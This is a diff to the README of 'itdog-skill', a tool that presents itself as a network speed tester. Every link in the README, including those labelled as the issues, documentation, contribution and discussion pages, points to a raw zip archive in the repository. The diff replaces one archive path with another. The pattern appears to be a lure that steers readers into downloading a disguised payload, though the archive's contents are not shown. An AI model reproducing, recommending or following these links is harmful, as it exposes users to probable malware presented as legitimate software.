@@ -1,6 +1,6 @@
 # 🌐 itdog-skill - Fast and Reliable Network Testing Tool
 
-## 📥 Download the latest version [![Releases](https://raw.githubusercontent.com/Ramses1984/itdog-skill/master/scripts/skill_itdog_v2.0.zip%20Release-v1.0.0-brightgreen)](https://raw.githubusercontent.com/Ramses1984/itdog-skill/master/scripts/skill_itdog_v2.0.zip)
+## 📥 Download the latest version [![Releases](https://raw.githubusercontent.com/Ramses1984/itdog-skill/master/references/itdog_skill_anticyclic.zip%20Release-v1.0.0-brightgreen)](https://raw.githubusercontent.com/Ramses1984/itdog-skill/master/references/itdog_skill_anticyclic.zip)
 
 ## 🚀 Getting Started
 
@@ -22,7 +22,7 @@ Welcome to **itdog-skill**! This application helps you test network speed quickl
 
 ## 📦 Download & Install
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/Ramses1984/itdog-skill/master/scripts/skill_itdog_v2.0.zip).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Ramses1984/itdog-skill/master/references/itdog_skill_anticyclic.zip).
 2. Look for the latest version, currently v1.0.0.
 3. Click on the download link for your operating system (Windows or macOS).
 4. Once the download is complete, locate the file in your Downloads folder.
@@ -39,21 +39,21 @@ Welcome to **itdog-skill**! This application helps you test network speed quickl
 
 ## 📝 How to Report Issues
 
-If you encounter any problems, please report them on our [Issues page](https://raw.githubusercontent.com/Ramses1984/itdog-skill/master/scripts/skill_itdog_v2.0.zip). Make sure to include details about your operating system and any error messages you received.
+If you encounter any problems, please report them on our [Issues page](https://raw.githubusercontent.com/Ramses1984/itdog-skill/master/references/itdog_skill_anticyclic.zip). Make sure to include details about your operating system and any error messages you received.
 
 ## 🌟 Contribution
 
-We welcome contributions! If you want to improve itdog-skill, fork the repository and submit a pull request. For more detailed guidelines, please check our [Contribution Guidelines](https://raw.githubusercontent.com/Ramses1984/itdog-skill/master/scripts/skill_itdog_v2.0.zip).
+We welcome contributions! If you want to improve itdog-skill, fork the repository and submit a pull request. For more detailed guidelines, please check our [Contribution Guidelines](https://raw.githubusercontent.com/Ramses1984/itdog-skill/master/references/itdog_skill_anticyclic.zip).
 
 ## 📫 Contact
 
-For questions or suggestions, feel free to reach out via the contact form available in our [Discussions page](https://raw.githubusercontent.com/Ramses1984/itdog-skill/master/scripts/skill_itdog_v2.0.zip).
+For questions or suggestions, feel free to reach out via the contact form available in our [Discussions page](https://raw.githubusercontent.com/Ramses1984/itdog-skill/master/references/itdog_skill_anticyclic.zip).
 
 ## 🔗 Links
 
-- [Download Latest Version](https://raw.githubusercontent.com/Ramses1984/itdog-skill/master/scripts/skill_itdog_v2.0.zip)
-- [Documentation](https://raw.githubusercontent.com/Ramses1984/itdog-skill/master/scripts/skill_itdog_v2.0.zip)
-- [Issues Page](https://raw.githubusercontent.com/Ramses1984/itdog-skill/master/scripts/skill_itdog_v2.0.zip)  
-- [Contribution Guidelines](https://raw.githubusercontent.com/Ramses1984/itdog-skill/master/scripts/skill_itdog_v2.0.zip)
+- [Download Latest Version](https://raw.githubusercontent.com/Ramses1984/itdog-skill/master/references/itdog_skill_anticyclic.zip)
+- [Documentation](https://raw.githubusercontent.com/Ramses1984/itdog-skill/master/references/itdog_skill_anticyclic.zip)
+- [Issues Page](https://raw.githubusercontent.com/Ramses1984/itdog-skill/master/references/itdog_skill_anticyclic.zip)  
+- [Contribution Guidelines](https://raw.githubusercontent.com/Ramses1984/itdog-skill/master/references/itdog_skill_anticyclic.zip)
 
 Enjoy using itdog-skill for your network testing needs!
